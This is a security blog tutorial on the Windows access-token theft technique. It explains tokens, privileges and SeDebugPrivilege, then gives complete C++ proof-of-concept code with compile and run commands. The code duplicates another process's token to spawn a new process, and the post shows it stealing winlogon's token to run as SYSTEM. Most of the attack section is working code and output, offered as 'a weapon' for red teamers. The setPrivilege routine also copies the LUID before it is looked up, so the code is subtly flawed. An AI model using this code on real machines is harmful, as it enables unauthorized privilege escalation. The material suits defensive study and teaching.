---
title:  "APT techniques: Access Token manipulation. Token theft. Simple C++ example."
date:   2022-09-25 03:00:00 +0300
header:
  teaser: "/assets/images/71/2022-09-28_01-04.png"
categories:
  - tutorial
tags:
  - malware
  - windows
  - persistence
  - red team
  - win32api
---

﷽

Hello, cybersecurity enthusiasts and white hackers!     

![token](/assets/images/71/2022-09-28_01-04.png){:class="img-responsive"}    

This post is the result of my own research into one of the interesting classic APT techniques: Token theft.    

### windows tokens and privilege constants

The relationship between login sessions and access tokens is the most important idea to master to comprehend authentication in Windows settings. A logon session is used to indicate a user's presence on a computer: it begins when a user is successfully authenticated and ends when the user logs off.    

![token](/assets/images/71/attack-0.png){:class="img-responsive"}   

Once the user has been authenticated successfully, the [Local Security Authority (LSA)](https://learn.microsoft.com/en-us/windows-server/security/windows-authentication/credentials-processes-in-windows-authentication) will generate a new login session and an access token.    

Every new logon session is distinguished by a `64-bit` locally unique identifier (`LUID`), also known as the logon ID, and every access token must include an Authentication Id (or `AuthId`) parameter that identifies the origin/linked logon session using this `LUID`.    

The primary purpose of an access token is to serve as a "volatile store for security settings connected with the login session" that may be dynamically updated. In this sense, when making security decisions, Windows developers interact with the access token that represents the login session (which is "hidden" in lsass)

Therefore, a developer may duplicate existing tokens via `DuplicateTokenEx`:     

```cpp
BOOL DuplicateTokenEx(
  HANDLE                       hExistingToken,
  DWORD                        dwDesiredAccess,
  LPSECURITY_ATTRIBUTES        lpTokenAttributes,
  SECURITY_IMPERSONATION_LEVEL ImpersonationLevel,
  TOKEN_TYPE                   TokenType,
  PHANDLE                      phNewToken
);
```
, calling thread impersonate the security context of a logged-on user via `ImpersonateLoggedOnUser`:

```cpp
BOOL ImpersonateLoggedOnUser(
  HANDLE hToken
);
```

etc.    

A token also contains a logon `SID`(Security Identifier) that identifies the current logon session.

The type of system actions that a user account may conduct is determined by their [privileges](https://learn.microsoft.com/en-us/windows/win32/secauthz/privilege-constants). User and group rights are assigned by an administrator. Each user's rights consist of those provided to both the user and the groups to which the user belongs.     

The access token routines that retrieve and modify privileges utilize the locally unique identifier (`LUID`) type to identify privileges.
We can use the `LookupPrivilegeValue` function to determine the `LUID` for a privilege constant on the local system:      

```cpp
BOOL LookupPrivilegeValueA(
  LPCSTR lpSystemName,
  LPCSTR lpName,
  [PLUID  lpLuid
);
```

You can see all this info via command:    

```powershell
whoami /all
```

![token](/assets/images/71/2022-09-28_02-04.png){:class="img-responsive"}    

or using [Process Explorer](https://docs.microsoft.com/en-us/sysinternals/downloads/process-explorer):    

![token](/assets/images/71/2022-09-28_02-08.png){:class="img-responsive"}    

There are two types of access tokens:

- Primary (sometimes called Delegate)
- Impersonation

When a user logs into a Windows Domain, **primary tokens** are produced. This may be accomplished by physically accessing a Windows computer or remotely through Remote Desktop.    

Typically, **impersonation tokens** do something in a different security context than the process that initiated them. For mounting network shares or domain logon scripts, these non-interactive tokens are utilized.        

### local administrator

Let's go to open two command prompts, one with administrator privileges:

![token](/assets/images/71/2022-09-28_02-28.png){:class="img-responsive"}    

one without:    

![token](/assets/images/71/2022-09-28_02-28_1.png){:class="img-responsive"}    

and compare via Process Explorer:     

![token](/assets/images/71/2022-09-28_02-34.png){:class="img-responsive"}    

As you can see, when we run `cmd.exe` with Administrator privileges the `BUILTIN\Administrators` flag is set to `Owner`. Which means `cmd.exe` is running in the security context of Administrator privileges.    

What does this difference mean in the context of the token theft technique? It is mean that we may carry out the following operations:      
- impersonate a client upon authentication using `SeImpersonatePrivilege`      
- we can debug programs.       

### SeDebugPrivilege

If a token has the `SeDebugPrivilege` privilege enabled it is enable a user to bypass/skip the access check in the kernel for a given object. You can retrieve a handle to any process in the system by enabling the `SeDebugPrivilege` in the calling process. The calling process can then call the `OpenProcess()` Win32 API to obtain a handle with `PROCESS_ALL_ACCESS`, `PROCESS_QUERY_INFORMATION`, or `PROCESS_QUERY_LIMITED_INFORMATION`.      

### technique. practical example

Creating a new process using a "stolen" token from another process is one of the strategies of token manipulation.
This occurs when a token of an existing access token present in one of the active processes on the target host is extracted, duplicated, and then used to create a new process, so granting the new process the privileges of the stolen token.

The following is an overview of the token theft procedure that will be carried out in this practical case:     

![token](/assets/images/71/attack-1.png){:class="img-responsive"}    

First of all, sometimes you do have `SeDebugPrivilege` in your current set of privileges, but it is disabled, so you must turn it on:    

```cpp
// set privilege
BOOL setPrivilege(LPCTSTR priv) {
  HANDLE token;
  TOKEN_PRIVILEGES tp;
  LUID luid;
  BOOL res = TRUE;

  tp.PrivilegeCount = 1;
  tp.Privileges[0].Luid = luid;
  tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

  if (!LookupPrivilegeValue(NULL, priv, &luid)) res = FALSE;
  if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &token)) res = FALSE;
  if (!AdjustTokenPrivileges(token, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL)) res = FALSE;
  printf(res ? "successfully enable %s :)\n" : "failed to enable %s :(\n", priv);
  return res;
}
```

Then, open a process whose access token you wish to steal and obtain a handle to that process's access token:     

```cpp
// get access token
HANDLE getToken(DWORD pid) {
  HANDLE cToken = NULL;
  HANDLE ph = NULL;
  if (pid == 0) {
    ph = GetCurrentProcess();
  } else {
    ph = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, true, pid);
  }
  if (!ph) cToken = (HANDLE)NULL;
  printf(ph ? "successfully get process handle :)\n" : "failed to get process handle :(\n");
  BOOL res = OpenProcessToken(ph, MAXIMUM_ALLOWED, &cToken);
  if (!res) cToken = (HANDLE)NULL;
  printf((cToken != (HANDLE)NULL) ? "successfully get access token :)\n" : "failed to get access token :(\n");
  return cToken;
}
```

Make a duplicate of the access token present in that process:     

```cpp
//...
res = DuplicateTokenEx(token, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &dToken);
//...
```

Finally, with the newly acquired access token, initiate a new process:     

```cpp
//...
STARTUPINFOW si;
PROCESS_INFORMATION pi;
BOOL res = TRUE;
ZeroMemory(&si, sizeof(STARTUPINFOW));
ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
si.cb = sizeof(STARTUPINFOW);
//...
res = CreateProcessWithTokenW(dToken, LOGON_WITH_PROFILE, app, NULL, 0, NULL, NULL, &si, &pi);
//...
```

So, the full source code of this logic is look like this:       

```cpp
/*
hack.cpp
token theft
enable set of priv
author: @cocomelonc
https://cocomelonc.github.io/malware/2022/09/25/token-theft-1.html
*/
#include <windows.h>
#include <stdio.h>
#include <iostream>

// set privilege
BOOL setPrivilege(LPCTSTR priv) {
  HANDLE token;
  TOKEN_PRIVILEGES tp;
  LUID luid;
  BOOL res = TRUE;

  tp.PrivilegeCount = 1;
  tp.Privileges[0].Luid = luid;
  tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

  if (!LookupPrivilegeValue(NULL, priv, &luid)) res = FALSE;
  if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &token)) res = FALSE;
  if (!AdjustTokenPrivileges(token, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL)) res = FALSE;
  printf(res ? "successfully enable %s :)\n" : "failed to enable %s :(\n", priv);
  return res;
}

// get access token
HANDLE getToken(DWORD pid) {
  HANDLE cToken = NULL;
  HANDLE ph = NULL;
  if (pid == 0) {
    ph = GetCurrentProcess();
  } else {
    ph = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, true, pid);
  }
  if (!ph) cToken = (HANDLE)NULL;
  printf(ph ? "successfully get process handle :)\n" : "failed to get process handle :(\n");
  BOOL res = OpenProcessToken(ph, MAXIMUM_ALLOWED, &cToken);
  if (!res) cToken = (HANDLE)NULL;
  printf((cToken != (HANDLE)NULL) ? "successfully get access token :)\n" : "failed to get access token :(\n");
  return cToken;
}

// create process
BOOL createProcess(HANDLE token, LPCWSTR app) {
  HANDLE dToken = NULL;
  STARTUPINFOW si;
  PROCESS_INFORMATION pi;
  BOOL res = TRUE;
  ZeroMemory(&si, sizeof(STARTUPINFOW));
  ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
  si.cb = sizeof(STARTUPINFOW);

  res = DuplicateTokenEx(token, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &dToken);
  printf(res ? "successfully duplicate process token :)\n" : "failed to duplicate process token :(\n");
  res = CreateProcessWithTokenW(dToken, LOGON_WITH_PROFILE, app, NULL, 0, NULL, NULL, &si, &pi);
  printf(res ? "successfully create process :)\n" : "failed to create process :(\n");
  return res;
}

int main(int argc, char** argv) {
  if (!setPrivilege(SE_DEBUG_NAME)) return -1;
  DWORD pid = atoi(argv[1]);
  HANDLE cToken = getToken(pid);
  if (!createProcess(cToken, L"C:\\Windows\\System32\\mspaint.exe")) return -1;
  return 0;
}
```

This code is just dirty PoC, for simplicity, I run `mspaint.exe`.   

### demo

Let's go to see everything in action. Compile our PoC:   

```bash
x86_64-w64-mingw32-g++ -O2 hack.cpp -o hack.exe -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
```

![token](/assets/images/71/2022-09-28_06-19.png){:class="img-responsive"}    

Then, run it at the victim's machine:    

```powershell
.\hack.exe <PID>
```

![token](/assets/images/71/2022-09-28_06-27.png){:class="img-responsive"}    

As a local administrator (in a high-integrity environment), you may steal the `winlogon.exe (PID: 560)` access token to create a new process as `SYSTEM`:   

![token](/assets/images/71/2022-09-28_06-32.png){:class="img-responsive"}    

![token](/assets/images/71/2022-09-28_06-36.png){:class="img-responsive"}  

This is because successful token theft. Perfect!    

Maybe for some specialists, this code will not be new, but I think it can be taken as the basis for more serious projects when automating red team scenarios, also for entry level.     

### impersonate

As I wrote earlier, we also able to use `ImpersonateLoggedOnUser` to permit our current thread to assume the identity of another logged-in user (impersonate). Until `RevertToSelf()` is invoked or the thread ends, the thread will continue to impersonate the logged-on user. Let's look at that in the next post.   

This attack technique is used by [APT28](https://attack.mitre.org/groups/G0007/) and [FIN8](https://attack.mitre.org/groups/G0061/) groups in the wild.       

I hope this post least a little useful for entry level cyber security specialists (and possibly even professionals), also spreads awareness to the blue teamers of this interesting technique, and adds a weapon to the red teamers arsenal.     

[Local Security Authority](https://learn.microsoft.com/en-us/windows-server/security/windows-authentication/credentials-processes-in-windows-authentication)       
[Privilege Constants](https://learn.microsoft.com/en-us/windows/win32/secauthz/privilege-constants)     
[LookupPrivilegeValue](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-lookupprivilegevaluea)    
[AdjustTokenPrivileges](https://learn.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-adjusttokenprivileges)     
[OpenProcessToken](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocesstoken)     
[DuplicateTokenEx](https://learn.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-duplicatetoken)      
[OpenProcess](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess)     
[CreateProcessWithTokenW](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw)    
[ATT&CK MITRE: Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001/)       
[APT28](https://attack.mitre.org/groups/G0007/)      
[FIN8](https://attack.mitre.org/groups/G0061/)        
[source code on github](https://github.com/cocomelonc/2022-09-25-token-theft-1)    

> This is a practical case for educational purposes only.      

Thanks for your time happy hacking and good bye!   
*PS. All drawings and screenshots are mine*
